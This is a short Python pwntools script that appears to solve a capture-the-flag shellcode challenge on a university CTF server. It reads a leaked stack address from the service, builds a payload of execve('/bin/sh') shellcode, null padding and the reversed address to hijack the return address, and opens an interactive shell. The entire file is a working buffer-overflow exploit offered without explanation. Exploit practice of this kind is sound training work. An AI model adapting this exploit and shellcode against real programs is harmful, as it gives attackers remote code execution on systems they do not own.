from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11003
p = remote(host, port)
#p = process('./shellcode')
s = str(p.recvline())
print s # Your input buffer...
l = s[-13:-1]
print(l)
l = l.decode('hex')
shellcode = "\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh"
for i in range(83):
    shellcode += '\x00'
shellcode += l[::-1]
shellcode += '\x00\x00'

p.sendline(shellcode)
p.interactive()

